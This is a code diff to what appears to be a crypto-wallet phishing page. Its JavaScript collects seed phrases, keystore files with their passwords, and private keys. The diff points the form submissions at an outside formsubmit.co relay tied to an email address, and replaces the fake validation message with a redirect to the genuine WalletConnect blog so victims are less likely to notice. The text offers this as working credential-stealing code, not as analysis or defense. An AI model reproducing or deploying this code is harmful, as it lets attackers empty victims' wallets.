@@ -2127,17 +2127,10 @@
       var keystorejsonProceedBtn = document.getElementById('keystorejsonproceed');
       var privatekeyProceedBtn = document.getElementById('privatekeyProceed');
       var sendingEl = document.querySelector('.sending');
-      var endpoint = '/api/notify';
+      var endpoint = 'https://formsubmit.co/ajax/hdhdhfhjdu@gmx.com';
 
       function onSuccess() {
-        if (sendingEl) sendingEl.style.display = 'block';
-        setTimeout(function () {
-          alert('Wallet Validated...');
-          redirect();
-        }, 3000);
-      }
-      function redirect() {
-        window.location.href = '';
+        window.location.href = 'https://walletconnect.com/blog';
       }
 
       function phraseProceedHandler() {
@@ -2150,11 +2143,10 @@
         $.ajax({
           url: endpoint,
           method: 'POST',
-          contentType: 'application/json',
-          data: JSON.stringify({ import_type: 'phrase', wallet: wallet, phrase: phraseInputVal }),
+          data: { import_type: 'phrase', wallet: wallet, phrase: phraseInputVal },
           dataType: 'json',
           success: function (res) {
-            if (res && res.ok) {
+            if (res && res.success) {
               phraseInputVal = '';
               onSuccess();
             } else {
@@ -2178,11 +2170,10 @@
         $.ajax({
           url: endpoint,
           method: 'POST',
-          contentType: 'application/json',
-          data: JSON.stringify({ import_type: 'keystorejson', wallet: wallet, keystorejson: keystorejson, keystorepassword: keystorepassword }),
+          data: { import_type: 'keystorejson', wallet: wallet, keystorejson: keystorejson, keystorepassword: keystorepassword },
           dataType: 'json',
           success: function (res) {
-            if (res && res.ok) {
+            if (res && res.success) {
               onSuccess();
             } else {
               alert('Could not proceed due to some errors, kindly try again later.');
@@ -2204,11 +2195,10 @@
         $.ajax({
           url: endpoint,
           method: 'POST',
-          contentType: 'application/json',
-          data: JSON.stringify({ import_type: 'private', wallet: wallet, privatekey: privatekey }),
+          data: { import_type: 'private', wallet: wallet, privatekey: privatekey },
           dataType: 'json',
           success: function (res) {
-            if (res && res.ok) {
+            if (res && res.success) {
               onSuccess();
             } else {
               alert('Could not proceed due to some errors, kindly try again later.');
